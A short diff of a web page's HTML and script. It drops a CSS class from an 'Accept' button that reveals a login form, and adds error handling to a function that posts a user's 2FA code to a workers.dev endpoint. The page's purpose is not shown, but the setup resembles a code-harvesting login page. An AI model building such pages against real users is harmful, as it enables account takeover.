@@ -46,8 +46,7 @@
   <button onclick="login()">Login</button>
   <p id="msg"></p>
 </div>
-
-<button class="accept-button" onclick="this.style.display='none'; document.getElementById('login').style.display='block';">
+<button onclick="this.style.display='none'; document.getElementById('login').style.display='block';">
   Accept
 </button>
 
@@ -99,21 +98,33 @@ async function login() {
 }
 
 async function verifyCode() {
-  const res = await fetch("https://hashcheck.jamesxcarver.workers.dev/", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      type: "2fa",
-      code: document.getElementById("code").value
-    })
-  });
+  const code = document.getElementById("code").value;
 
-  const data = await res.json();
-  document.getElementById("msg").textContent = data.message;
+  document.getElementById("msg").textContent = "Checking...";
+
+  try {
+    const res = await fetch("https://hashcheck.jamesxcarver.workers.dev/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        type: "2fa",
+        code: code
+      })
+    });
+
+    const data = await res.json();
+
+    document.getElementById("msg").textContent = data.message;
+
+  } catch (error) {
+    console.error(error);
+    document.getElementById("msg").textContent = "Connection error.";
+  }
 }
 </script>
+
  </div>
  </main>
  <footer>
